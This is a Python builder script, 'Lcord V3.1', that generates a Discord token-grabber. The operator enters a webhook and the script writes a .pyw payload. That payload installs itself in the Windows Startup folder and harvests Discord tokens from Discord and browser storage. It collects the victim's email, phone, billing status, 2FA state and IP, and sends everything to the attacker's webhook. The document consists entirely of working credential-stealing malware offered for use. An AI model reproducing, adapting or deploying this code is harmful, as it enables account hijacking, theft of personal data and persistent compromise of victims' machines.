from pystyle import Colorate, Colors, System, Center, Write, Anime

from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Loading LCORD...")
print(f"{Fore.WHITE}")
progressbar = tqdm([2,4,6,8,9,10])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' Loading: ')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title Loading assets...")
print(f"{Fore.PURPLE_EX}")
progressbar = tqdm([2,4,6,8,9,10,11,12,13,14,15])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' 2/9 assets loaded... ')
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import os
os.system("title creating HUD...")
print(f"{Fore.WHITE}")
progressbar = tqdm([1,2,3])
for item in progressbar:
    sleep(0.1)
    progressbar.set_description(' HUD Creating... ')

   
def mkdata(webhook: str, ping: bool) -> str:
    return r"""# by high
# https://ayo.so/highw
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from re import findall
from json import loads, dumps
from shutil import copy
path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/riot.pyw" % getenv("userprofile")
if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()
webhook = '""" + webhook + r"""'
pingme = """ + str(ping) + r"""
class Discord:
    def setheaders(token: str = None) -> dict:
        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers['authorization'] = token
        return headers
    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                try: 
                                    urlopen(Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token)))
                                except HTTPError:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)
            return found_tokens
        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens
class Grab:
    def token_grab(token: str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            try:
                urlopen(Request(url, headers=Discord.setheaders()))
            except HTTPError:
                url += ".gif"
            return url
        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token))).read()))
            except:
                pass
            return has
        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"
        def verify(var):
            return valid if var else invalid
        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token))).read())
        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))
        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)
        if not phone:
            phone = invalid
        data = [{
            "title": "Click Me!",
            "description": "Grabbed!",
            "url": "https://ayo.so/high",
            "image": {
                "url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg"
            },
            "color": #A020F0,
            "fields": [
                {
                    "name": "**email + phone**",
                            "value": f'Email: {email}\nPhone number: {phone}\nBilling Info: {billing}',
                            "inline": True
                },
                {
                    "name": "**ip + cpu name**",
                            "value": f"IP: {ip}\nUtilisateur: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**nitro + 2fa**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },
            "thumbnail": {
                "url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg"
            },
            "footer": {
                "text": "by high :)"
            }
        }]
        Grab.send(data)
    def send(data: str):
        data = {"username": "Lcord",
                "avatar_url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg8",
                "embeds": data,
                "content": "@everyone"}
        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
sent_tokens = []
def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)
ready_data = [{
    "title": "Lcord",
    "description": "Initialized!",
    "url": "https://ayo.so/high",
    "image": {
        "url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg"
    },
    "color": 0x1D5EFF,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'im ready to steal people's tokens today',
            "inline": True
        }
    ],
    "thumbnail": {
        "url": "https://cdn.discordapp.com/attachments/953329339661951019/955381759338483792/avatars-lu0UWqF3aMxa7TZV-GPoH0Q-t500x500.jpg"
    },
    "footer": {
        "text": "by high"
    }
}]
Grab.send(ready_data)
while True:
    if not isfile(__file__):
        exit()
    token_grab()
"""


Lcord = '''

 /$$        /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$        /$$    /$$  /$$$$$$ 
| $$       /$$__  $$ /$$__  $$| $$__  $$| $$__  $$      | $$   | $$ /$$__  $$
| $$      | $$  \__/| $$  \ $$| $$  \ $$| $$  \ $$      | $$   | $$|__/  \ $$
| $$      | $$      | $$  | $$| $$$$$$$/| $$  | $$      |  $$ / $$/   /$$$$$/
| $$      | $$      | $$  | $$| $$__  $$| $$  | $$       \  $$ $$/   |___  $$
| $$      | $$    $$| $$  | $$| $$  \ $$| $$  | $$        \  $$$/   /$$  \ $$
| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$| $$$$$$$/         \  $/   |  $$$$$$/
|________/ \______/  \______/ |__/  |__/|_______/           \_/     \______/ 
                                                                             
                ¤¸¸.•´¯`•¸¸.•..>> Ayo.so/highW <<..•.¸¸•´¯`•.¸¸¤                                           
                                                                             '''[1:]


banner = r'''
       __      __       .__                                   ___________     
      /  \    /  \ ____ |  |   ____  ____   _____   ____      \__    ___/___  
      \   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \       |    | /  _ \ 
       \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/       |    |(  <_> )
        \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >      |____| \____/ 
             \/       \/          \/            \/     \/                    
                                                                                                        
                                                                                                        
LLLLLLLLLLL                    CCCCCCCCCCCCC     OOOOOOOOO     RRRRRRRRRRRRRRRRR   DDDDDDDDDDDDD        
L:::::::::L                 CCC::::::::::::C   OO:::::::::OO   R::::::::::::::::R  D::::::::::::DDD     
L:::::::::L               CC:::::::::::::::C OO:::::::::::::OO R::::::RRRRRR:::::R D:::::::::::::::DD   
LL:::::::LL              C:::::CCCCCCCC::::CO:::::::OOO:::::::ORR:::::R     R:::::RDDD:::::DDDDD:::::D  
  L:::::L               C:::::C       CCCCCCO::::::O   O::::::O  R::::R     R:::::R  D:::::D    D:::::D 
  L:::::L              C:::::C              O:::::O     O:::::O  R::::R     R:::::R  D:::::D     D:::::D
  L:::::L              C:::::C              O:::::O     O:::::O  R::::RRRRRR:::::R   D:::::D     D:::::D
  L:::::L              C:::::C              O:::::O     O:::::O  R:::::::::::::RR    D:::::D     D:::::D
  L:::::L              C:::::C              O:::::O     O:::::O  R::::RRRRRR:::::R   D:::::D     D:::::D
  L:::::L              C:::::C              O:::::O     O:::::O  R::::R     R:::::R  D:::::D     D:::::D
  L:::::L              C:::::C              O:::::O     O:::::O  R::::R     R:::::R  D:::::D     D:::::D
  L:::::L         LLLLLLC:::::C       CCCCCCO::::::O   O::::::O  R::::R     R:::::R  D:::::D    D:::::D 
LL:::::::LLLLLLLLL:::::L C:::::CCCCCCCC::::CO:::::::OOO:::::::ORR:::::R     R:::::RDDD:::::DDDDD:::::D  
L::::::::::::::::::::::L  CC:::::::::::::::C OO:::::::::::::OO R::::::R     R:::::RD:::::::::::::::DD   
L::::::::::::::::::::::L    CCC::::::::::::C   OO:::::::::OO   R::::::R     R:::::RD::::::::::::DDD     
LLLLLLLLLLLLLLLLLLLLLLLL       CCCCCCCCCCCCC     OOOOOOOOO     RRRRRRRR     RRRRRRRDDDDDDDDDDDDD        
                                                                                                        
                                                                                                        
                                                                                                        
                                     Please press [ENTER]                                                                   
                                                                                                        
                                                                                                        
                                                                                                         '''[1:]


System.Clear()
System.Size(155, 45)
System.Title("Lcord V3.1 // Ayo.so/highW // dicord.gg/fXEDpac9HT ")


Anime.Fade(Center.Center(banner), Colors.purple_to_blue,
           Colorate.Vertical, enter=True)


def main():
    System.Clear()

    print("\n"*2)
    print(Colorate.DiagonalBackwards(Colors.purple_to_blue, Center.XCenter(Lcord)))
    print("\n"*5)

    webhook = Write.Input("Enter your webhook -> ",
                          Colors.purple_to_blue, interval=0.005)

    if not webhook.strip():
        Colorate.Error("Please enter a valid webhook!")
        return

    ping = Write.Input("Would you like to get pinged when you get a hit? [y/n] -> ",
                       Colors.red_to_blue, interval=0.005)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Please enter either 'y' or 'n'!")
        return
    
    ping = ping == 'y'

    data = mkdata(webhook=webhook, ping=ping)
    with open("RenameMe.pyw", 'w', encoding='utf-8') as f:
        f.write(data)

    print()
    Write.Input("Grabber successfully built", Colors.red_to_blue, interval=0.005)
    return exit()


if __name__ == '__main__':
    while True:
        main()
